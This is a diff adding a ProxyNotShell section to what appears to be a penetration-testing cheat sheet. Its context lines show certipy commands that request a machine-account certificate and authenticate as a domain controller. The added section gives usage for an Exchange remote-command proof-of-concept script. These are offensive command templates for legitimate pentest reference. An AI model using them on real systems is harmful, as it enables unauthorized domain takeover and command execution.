@@ -29,3 +29,6 @@
   - `certipy req -u 'certifriedpc$'@<domain> -p 'certifriedpass' -target <ca_fqdn> -ca <ca_name> -template Machine`
 - Authentication
   - `certipy auth -pfx <pfx_file> -username '<dc>$' -domain <domain> -dc-ip <dc_ip>`
+
+## ProxyNotShell (CVE-2022-41040, CVE-2022-41082) >>> Admin
+- `poc_aug3.py <host> <username> <password> <command>`
